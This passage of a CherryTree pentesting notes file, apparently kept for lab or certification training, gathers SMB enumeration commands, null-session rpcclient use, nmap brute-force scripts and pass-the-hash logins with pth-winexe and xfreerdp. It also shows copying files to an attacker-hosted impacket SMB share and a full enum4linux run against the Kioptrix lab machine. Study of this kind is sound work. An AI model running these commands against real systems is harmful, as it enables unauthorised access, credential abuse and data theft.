+						<rich_text scale="h2">Pass the hash</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text weight="heavy">SMB</rich_text>
+						<rich_text>
+In order to use pass the hash, we first need to put the hash in a env variable using the export command:
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+So we will atuhenticate against a smb-service.
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+I think you can run it like this too:
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+</rich_text>
+						<rich_text weight="heavy">Remote Desktop</rich_text>
+						<rich_text>
+</rich_text>
+						<rich_text justification="left"></rich_text>
+						<rich_text>
+
+</rich_text>
+						<rich_text scale="h2">Exploits</rich_text>
+						<rich_text>
+EternalBlue (MS17-010)
+</rich_text>
+						<codebox char_offset="183" frame_height="1034" frame_width="700" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">nmblookup -A 10.1.1.1
+
+smbclient //MOUNT/share -I 10.1.1.1 -N
+# connect to share, -N no password prompt
+
+smbclient -L \\10.11.1.1 -U bob -S off
+rpcclient -p 139 -U &quot;bob&quot; -S off 10.11.1.1
+# disable message signing
+
+rpcclient -U &quot;&quot; 10.1.1.1
+# works on older windows versions
+
+enum4linux 10.1.1.1
+# discover Windows/Samba servers on subnet, finds Windows MAC addresses, netbios name &amp; discover client workgroup/domain
+
+nbtscan 10.1.1.0/24
+# do everything, runs all options apart from dictionary based share name guessing
+
+enum4linux -a 10.1.1.1
+# performs all basic enumeration using smb null session
+
+enum4linux -U 192.168.1.2   
+#-You will get userlist
+# SMB null session is an unauthenticated netbios session between two computers.
+# SMB null session is available for SMB1 systems only i.e 2000,xp,2003
+
+#To use an smb null session :
+rpcclient -U &quot;&quot; 192.168.1.2
+#when asked enter empty password
+rpcclient $&gt;srvinfo
+rpcclient $&gt;enumdomusers
+rpcclient $&gt;querydominfo
+rpcclient $&gt;getdompwinfo
+#password policy
+rpcclient $&gt;netshareenum
+nmblookup -A 192.168.1.1
+rpcinfo -p &lt;target&gt;
+
+#Enumerate using smbclinet:
+smbclient -L //192.168.1.2
+smbclient -L //192.168.1.2/myshare -U anonymous
+
+smb&gt; get data.txt
+smb&gt;put evil.txt
+
+#Brute SMB password:
+nmap -p445 --script=smb-brute.nse &lt;ip&gt;
+
+# Brute force should always be your last option. 
+# You can also use hydra to do it.
+
+#Using nmap:
+nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.1.200-254
+
+nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24
+
+nmap -sSU -script smb-os-discovery.nse -p U:137,T:139,445 --script-args=smbsign=disable,smbuser=username,smbpass=password -oA 10.11.1.5_smbos -vv -n -Pn 10.11.1.5
+
+nmap -sSU -script smb-vuln\* -p U:137,T:139,445 --script-args=smbsign=disable,smbuser=username,smbpass=password -oA 10.11.1.5_smbvuln -vv -n -Pn 10.11.1.5
+
+nmap -sSU -script smb-enum\* -p U:137,T:139,445 --script-args=smbuser=username,smbpass=password -oA 10.11.1.5_smbenum -vv -n -Pn 10.11.1.5</codebox>
+						<codebox char_offset="210" frame_height="44" frame_width="475" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True"></codebox>
+						<codebox char_offset="234" frame_height="119" frame_width="475" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">nmap -oA 192.168.1.0_shares --script=smb-enum-shares --script-args=smbuser=username,smbpass=password -p445 192.168.1.0/24   
+# possible techniques - specify no creds, empty creds, correct creds and incorrect creds
+
+smbclient -L //192.168.1.100 -N
+#list shares with no password prompt</codebox>
+						<codebox char_offset="257" frame_height="44" frame_width="475" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">nmap --script=smb-enum-users -sSU -pU:137,T:139 -oA 192.168.1.200-254_smbusers 192.168.11.200-254 </codebox>
+						<codebox char_offset="271" frame_height="125" frame_width="545" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">python /usr/share/doc/python-impacket/examples/smbserver.py probfine ./
+
+#Get
+copy \\10.1.1.1\probfine\payload .
+
+#Put
+copy C:\coolinfo \\10.1.1.1\probfine\</codebox>
+						<codebox char_offset="397" frame_height="35" frame_width="590" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896</codebox>
+						<codebox char_offset="447" frame_height="35" frame_width="365" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">pth-winexe -U administrator //192.168.1.101 cmd</codebox>
+						<codebox char_offset="488" frame_height="35" frame_width="365" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">pth-winexe -U admin/hash:has //192.168.0.101 cmd</codebox>
+						<codebox char_offset="506" frame_height="80" frame_width="455" highlight_brackets="True" show_line_numbers="False" syntax_highlighting="sh" width_in_pixels="True">apt-get update
+apt-get install freerdp-x11
+
+xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101</codebox>
+						<node custom_icon_id="0" foreground="" is_bold="False" name="enum4linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1587571038.1" ts_lastsave="1587571141.0" unique_id="87">
+							<rich_text>enum4linux -v target
+---
+[V] Dependent program &quot;nmblookup&quot; found in /usr/bin/nmblookup
+[V] Dependent program &quot;net&quot; found in /usr/bin/net
+[V] Dependent program &quot;rpcclient&quot; found in /usr/bin/rpcclient
+[V] Dependent program &quot;smbclient&quot; found in /usr/bin/smbclient
+[V] Dependent program &quot;polenum&quot; found in /usr/bin/polenum
+[V] Dependent program &quot;ldapsearch&quot; found in /usr/bin/ldapsearch
+Starting enum4linux v0.8.9 ( </rich_text>
+							<rich_text link="webs http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</rich_text>
+							<rich_text> ) on Wed Apr 22 11:52:23 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... kioptrix1
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ================================================= 
+|    Enumerating Workgroup/Domain on kioptrix1    |
+ ================================================= 
+[V] Attempting to get domain name with command: nmblookup -A 'kioptrix1'
+[+] Got domain/workgroup name: MYGROUP
+
+ ========================================= 
+|    Nbtstat Information for kioptrix1    |
+ ========================================= 
+Looking up status of 192.168.16.129
+	KIOPTRIX        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+	KIOPTRIX        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+	KIOPTRIX        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+	..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+	MYGROUP         &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+	MYGROUP         &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+	MYGROUP         &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+
+	MAC Address = 00-00-00-00-00-00
+
+ ================================== 
+|    Session Check on kioptrix1    |
+ ================================== 
+[V] Attempting to make null session using command: smbclient -W 'MYGROUP' //'kioptrix1'/ipc$ -U''%'' -c 'help' 2&gt;&amp;1
+[+] Server kioptrix1 allows sessions using username '', password ''
+
+ ======================================== 
+|    Getting domain SID for kioptrix1    |
+ ======================================== 
+[V] Attempting to get domain SID with command: rpcclient -W 'MYGROUP' -U''%'' kioptrix1 -c 'lsaquery' 2&gt;&amp;1
+Domain Name: MYGROUP
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ =================================== 
+|    OS information on kioptrix1    |
+ =================================== 
+[V] Attempting to get OS info with command: smbclient -W 'MYGROUP' //'kioptrix1'/ipc$ -U''%'' -c 'q' 2&gt;&amp;1
+[+] Got OS info for kioptrix1 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+[V] Attempting to get OS info with command: rpcclient -W 'MYGROUP' -U''%'' -c 'srvinfo' 'kioptrix1' 2&gt;&amp;1
+[+] Got OS info for kioptrix1 from srvinfo:
+	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
+	platform_id     :	500
+	os version      :	4.5
+	server type     :	0x9a03
+
+ ========================== 
+|    Users on kioptrix1    |
+ ========================== 
+[V] Attempting to get userlist with command: rpcclient -W 'MYGROUP' -c querydispinfo -U''%'' 'kioptrix1' 2&gt;&amp;1
+Use of uninitialized value $users in print at ./enum4linux.pl line 874.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.
+
+[V] Attempting to get userlist with command: rpcclient -W 'MYGROUP' -c enumdomusers -U''%'' 'kioptrix1' 2&gt;&amp;1
+Use of uninitialized value $users in print at ./enum4linux.pl line 888.
+Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.
+
+ ====================================== 
+|    Share Enumeration on kioptrix1    |
+ ====================================== 
+[V] Attempting to get share list using authentication
+WARNING: The &quot;syslog&quot; option is deprecated
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       IPC Service (Samba Server)
+	ADMIN$          IPC       IPC Service (Samba Server)
+
+	Server               Comment
+	---------            -------
+	KIOPTRIX             Samba Server
+
+	Workgroup            Master
+	---------            -------
+	MYGROUP              KIOPTRIX
+
+[+] Attempting to map shares on kioptrix1
+[V] Attempting map to share //kioptrix1/IPC$ with command: smbclient -W 'MYGROUP' //'kioptrix1'/'IPC$' -U''%'' -c dir 2&gt;&amp;1
+//kioptrix1/IPC$	[E] Can't understand response:
+WARNING: The &quot;syslog&quot; option is deprecated
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*
+[V] Attempting map to share //kioptrix1/ADMIN$ with command: smbclient -W 'MYGROUP' //'kioptrix1'/'ADMIN$' -U''%'' -c dir 2&gt;&amp;1
+//kioptrix1/ADMIN$	[E] Can't understand response:
+WARNING: The &quot;syslog&quot; option is deprecated
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+tree connect failed: NT_STATUS_WRONG_PASSWORD
+
+ ================================================= 
+|    Password Policy Information for kioptrix1    |
+ ================================================= 
+[V] Attempting to get Password Policy info with command: polenum '':''@'kioptrix1' 2&gt;&amp;1
+[E] Unexpected error from polenum:
+Traceback (most recent call last):
+  File &quot;/usr/bin/polenum&quot;, line 33, in &lt;module&gt;
+    from impacket.dcerpc import dcerpc_v4, dcerpc, transport, samr
+ImportError: cannot import name dcerpc_v4[V] Attempting to get Password Policy info with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c &quot;getdompwinfo&quot; 2&gt;&amp;1
+
+[+] Retieved partial password policy with rpcclient:
+
+Password Complexity: Disabled
+Minimum Password Length: 0
+
+
+ =========================== 
+|    Groups on kioptrix1    |
+ =========================== 
+[V] Getting builtin groups with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'enumalsgroups builtin' 2&gt;&amp;1
+
+[+] Getting builtin groups:
+group:[Administrators] rid:[0x220]
+group:[Users] rid:[0x221]
+group:[Guests] rid:[0x222]
+group:[Power Users] rid:[0x223]
+group:[Account Operators] rid:[0x224]
+group:[System Operators] rid:[0x225]
+group:[Print Operators] rid:[0x226]
+group:[Backup Operators] rid:[0x227]
+group:[Replicator] rid:[0x228]
+
+[+] Getting builtin group memberships:
+[V] Running command: net rpc group members 'Users' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Users' (RID: 545) has member: Couldn't find group Users
+[V] Running command: net rpc group members 'Power Users' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Power Users' (RID: 547) has member: Couldn't find group Power Users
+[V] Running command: net rpc group members 'Guests' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Guests' (RID: 546) has member: Couldn't find group Guests
+[V] Running command: net rpc group members 'Account Operators' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Account Operators' (RID: 548) has member: Couldn't find group Account Operators
+[V] Running command: net rpc group members 'Replicator' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Replicator' (RID: 552) has member: Couldn't find group Replicator
+[V] Running command: net rpc group members 'System Operators' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'System Operators' (RID: 549) has member: Couldn't find group System Operators
+[V] Running command: net rpc group members 'Print Operators' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Print Operators' (RID: 550) has member: Couldn't find group Print Operators
+[V] Running command: net rpc group members 'Administrators' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Administrators' (RID: 544) has member: Couldn't find group Administrators
+[V] Running command: net rpc group members 'Backup Operators' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators
+[V] Getting local groups with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'enumalsgroups domain' 2&gt;&amp;1
+
+[+] Getting local groups:
+group:[sys] rid:[0x3ef]
+group:[tty] rid:[0x3f3]
+group:[disk] rid:[0x3f5]
+group:[mem] rid:[0x3f9]
+group:[kmem] rid:[0x3fb]
+group:[wheel] rid:[0x3fd]
+group:[man] rid:[0x407]
+group:[dip] rid:[0x439]
+group:[lock] rid:[0x455]
+group:[users] rid:[0x4b1]
+group:[slocate] rid:[0x413]
+group:[floppy] rid:[0x40f]
+group:[utmp] rid:[0x415]
+
+[+] Getting local group memberships:
+[V] Running command: net rpc group members 'dip' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'disk' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'wheel' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'lock' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'floppy' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'tty' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'mem' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'users' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'man' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'kmem' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'utmp' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'slocate' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Running command: net rpc group members 'sys' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+[V] Getting domain groups with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c &quot;enumdomgroups&quot; 2&gt;&amp;1
+
+[+] Getting domain groups:
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+
+[+] Getting domain group memberships:
+[V] Running command: net rpc group members 'Domain Users' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users
+[V] Running command: net rpc group members 'Domain Admins' -W 'MYGROUP' -I 'kioptrix1' -U''%'' 2&gt;&amp;1
+
+Group 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins
+
+ ==================================================================== 
+|    Users on kioptrix1 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ==================================================================== 
+[V] Attempting to get SID from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'lookupnames administrator' 2&gt;&amp;1
+[V] Assuming that user &quot;administrator&quot; exists
+[V] User &quot;administrator&quot; doesn't exist.  User enumeration should be possible, but SID needed...
+[V] Attempting to get SID from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'lookupnames guest' 2&gt;&amp;1
+[V] Assuming that user &quot;guest&quot; exists
+[V] User &quot;guest&quot; doesn't exist.  User enumeration should be possible, but SID needed...
+[V] Attempting to get SID from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'lookupnames krbtgt' 2&gt;&amp;1
+[V] Assuming that user &quot;krbtgt&quot; exists
+[V] User &quot;krbtgt&quot; doesn't exist.  User enumeration should be possible, but SID needed...
+[V] Attempting to get SID from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'lookupnames domain admins' 2&gt;&amp;1
+[V] Assuming that user &quot;domain admins&quot; exists
+[V] User &quot;domain admins&quot; doesn't exist.  User enumeration should be possible, but SID needed...
+[V] Attempting to get SID from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'lookupnames root' 2&gt;&amp;1
+[V] Assuming that user &quot;root&quot; exists
+[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623
+[V] Attempting to get SID from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'lookupnames bin' 2&gt;&amp;1
+[V] Assuming that user &quot;bin&quot; exists
+[V] Attempting to get SID from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c 'lookupnames none' 2&gt;&amp;1
+[V] Assuming that user &quot;none&quot; exists
+[V] User &quot;none&quot; doesn't exist.  User enumeration should be possible, but SID needed...
+[V] Attempting to get SIDs from kioptrix1 with command: rpcclient -W 'MYGROUP' -U''%'' 'kioptrix1' -c lsaenumsid 2&gt;&amp;1
+[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''
+S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\
+                                                        (0)
+S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)
+S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)
+S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)
+S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)
+
+ ========================================== 
+|    Getting printer info for kioptrix1    |
+ ========================================== 
+[V] Attempting to get printer info with command: rpcclient -W 'MYGROUP' -U''%'' -c 'enumprinters' 'kioptrix1' 2&gt;&amp;1
+No printers returned.
+
+
+enum4linux complete on Wed Apr 22 11:52:37 2020</rich_text>
+						</node>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="SNMP" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1500473619.73" ts_lastsave="1587570434.53" unique_id="50">
+						<rich_text></rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="DB" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1500473622.74" ts_lastsave="1500473677.59" unique_id="51">
+						<rich_text></rich_text>
+					</node>
+					<node custom_icon_id="0" foreground="" is_bold="False" name="Other" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1500473623.25" ts_lastsave="1500473681.55" unique_id="52">
+						<rich_text></rich_text>
+					</node>
